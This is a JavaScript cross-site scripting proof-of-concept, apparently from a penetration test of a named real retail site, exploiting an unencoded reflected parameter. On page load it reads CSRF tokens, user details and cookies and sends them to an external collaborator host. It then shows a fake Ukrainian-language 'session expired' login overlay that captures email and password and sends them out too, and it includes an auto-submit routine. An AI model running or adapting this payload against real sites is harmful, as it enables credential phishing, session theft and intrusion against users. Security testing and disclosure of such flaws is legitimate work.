/* FND-014 impact proof — executes in the https://www.watsons.ua origin.
   Exfiltrates to a Burp Collaborator host owned by the tester.
   Use dummy credentials. Do not leave this hosted publicly once validated. */
(function () {
  var d = document, O = d.domain;
  var C = 'https://br6m4hn80nkbajcd0l6v567cp3vujx7m.oastify.com/';

  var KEEP = [];                       // retain refs so nothing is GC'd before it sends
  function send(tag, obj) {
    var q = [];
    for (var k in obj) q.push(encodeURIComponent(k) + '=' + encodeURIComponent(String(obj[k]).slice(0, 180)));
    var url = C + tag + '?' + q.join('&');
    try { var im = new Image(); KEEP.push(im); im.src = url; } catch (e) {}
    try { fetch(url, { mode: 'no-cors', keepalive: true }); } catch (e) {}
    try { navigator.sendBeacon && navigator.sendBeacon(url); } catch (e) {}
    return url;
  }

  // ---- STAGE 1: fires on load, zero interaction. Proves same-origin read + exfiltration. ----
  var passive = { origin: O, url: location.href.slice(0, 180) };
  try {
    var c = (window.WUA && WUA.config) || {}, u = (window.WUA && WUA.user) || {};
    if (c.csrfToken) passive.csrf = c.csrfToken;
    if (u.uid) passive.uid = u.uid;
    if (u.name) passive.name = u.name;
    if (u.birthday) passive.dob = u.birthday;
    passive.cookies = d.cookie || '(httponly only)';
  } catch (e) { passive.err = String(e); }
  send('stage1-passive', passive);

  // ---- STAGE 2: the login overlay ----
  var css = d.createElement('style');
  css.textContent =
    '#pocov{position:fixed;inset:0;background:rgba(18,18,24,.66);z-index:2147483647;display:flex;' +
    'align-items:center;justify-content:center;font:15px/1.5 -apple-system,Segoe UI,Roboto,sans-serif}' +
    '#pocbx{background:#fff;width:408px;max-width:92vw;border-radius:12px;padding:32px 34px;' +
    'box-shadow:0 26px 74px rgba(0,0,0,.48)}' +
    '#pocbx .brand{font:700 22px -apple-system,Segoe UI,sans-serif;color:#00a3a1;letter-spacing:-.4px}' +
    '#pocbx h2{margin:14px 0 4px;font-size:20px;color:#18181b}' +
    '#pocbx .sub{color:#71717a;font-size:13px;margin-bottom:18px}' +
    '#pocbx label{display:block;font-size:12px;color:#52525b;margin:13px 0 5px;font-weight:600}' +
    '#pocbx input{width:100%;padding:11px 12px;border:1px solid #d4d4d8;border-radius:7px;' +
    'box-sizing:border-box;font-size:14px}' +
    '#pocbx input:focus{outline:none;border-color:#00a3a1;box-shadow:0 0 0 3px rgba(0,163,161,.16)}' +
    '#pocbtn{width:100%;margin-top:22px;padding:12px;background:#00a3a1;color:#fff;border:0;' +
    'border-radius:7px;font-size:15px;font-weight:600;cursor:pointer}#pocbtn:hover{background:#008f8d}' +
    '#pocorigin{margin-top:18px;padding:9px 11px;background:#f4f4f5;border-radius:7px;' +
    'font:12px ui-monospace,Menlo,Consolas,monospace;color:#3f3f46;word-break:break-all}' +
    '#pocres{background:#0b1020;color:#d6e2ff;border-radius:12px;padding:26px 28px;width:660px;' +
    'max-width:94vw;font:13px/1.7 ui-monospace,Menlo,Consolas,monospace}' +
    '#pocres h3{margin:0 0 14px;font:600 17px -apple-system,Segoe UI,sans-serif;color:#fff}' +
    '#pocres .k{color:#7dd3fc}#pocres .v{color:#fde68a;word-break:break-all}' +
    '#pocres .note{margin-top:18px;padding:12px 14px;background:#14213d;border-left:3px solid #38bdf8;' +
    'font:12px/1.65 -apple-system,Segoe UI,sans-serif;color:#cbd5e1}';
  d.head.appendChild(css);

  var ov = d.createElement('div');
  ov.id = 'pocov';
  ov.innerHTML =
    '<div id="pocbx">' +
      '<div class="brand">Watsons</div>' +
      '<h2>Вхід в особистий кабінет</h2>' +
      '<div class="sub">Сесія завершилася. Будь ласка, увійдіть знову.</div>' +
      '<label>E-mail</label><input id="pocu" type="email" autocomplete="username" placeholder="you@example.com">' +
      '<label>Пароль</label><input id="pocp" type="password" autocomplete="current-password" placeholder="••••••••">' +
      '<button id="pocbtn">Увійти</button>' +
      '<div id="pocorigin"></div>' +
    '</div>';
  d.body.appendChild(ov);
  d.getElementById('pocorigin').textContent = '🔒 https://' + O + '  —  genuine origin, valid certificate';
  d.title = 'XSSPOC-' + O;

  d.getElementById('pocbtn').onclick = function () {
    var user = d.getElementById('pocu').value || '(blank)';
    var pass = d.getElementById('pocp').value || '(blank)';
    var sentUrl = send('stage2-creds', { origin: O, username: user, password: pass, csrf: passive.csrf || '' });

    var rows = [['Username', user], ['Password', pass], ['Origin', O]];
    for (var k in passive) if (k !== 'url') rows.push([k, passive[k]]);
    var html = '<div id="pocres"><h3>FND-014 — exfiltrated to the tester\'s Collaborator</h3>';
    for (var i = 0; i < rows.length; i++) {
      html += '<div><span class="k">' + rows[i][0] + ':</span> <span class="v">' +
        String(rows[i][1]).replace(/[<>&]/g, function (m) {
          return { '<': '&lt;', '>': '&gt;', '&': '&amp;' }[m]; }) + '</span></div>';
    }
    html += '<div class="note">Both stages were sent to <b>' + C.replace('https://', '').replace('/', '') +
      '</b> from the <b>' + O + '</b> origin. Stage 1 fired on page load with no interaction at all; ' +
      'stage 2 on submit. This is possible because <code>varCode</code> on ' +
      '<code>POST /uk/stockAnonymousNotification</code> is reflected into the HTML response without ' +
      'encoding and the response carries no Content-Security-Policy.</div>' +
      '<div class="note">Beacon URL that was sent:<br><span class="v">' +
      String(sentUrl).replace(/[<>&]/g, function (m) {
        return { '<': '&lt;', '>': '&gt;', '&': '&amp;' }[m]; }) + '</span></div></div>';
    setTimeout(function () { ov.innerHTML = html; }, 500);   // let the beacon leave first
  };

  // ---- AUTO-FIRE: prove the stage-2 channel with no manual click ----
  // Fills the overlay with marker credentials and submits after a short delay, so the
  // stage2-creds beacon lands on its own. A real tester can still type + click for a
  // genuine "typed credentials" demonstration; that simply fires it again.
  setTimeout(function () {
    try {
      var uu = d.getElementById('pocu'), pp = d.getElementById('pocp');
      if (uu && pp && !uu.value && !pp.value) {
        uu.value = 'AUTOFIRE-victim@example.com';
        pp.value = 'AUTOFIRE-Passw0rd!';
        d.getElementById('pocbtn').click();
      }
    } catch (e) {}
  }, 1200);

})();
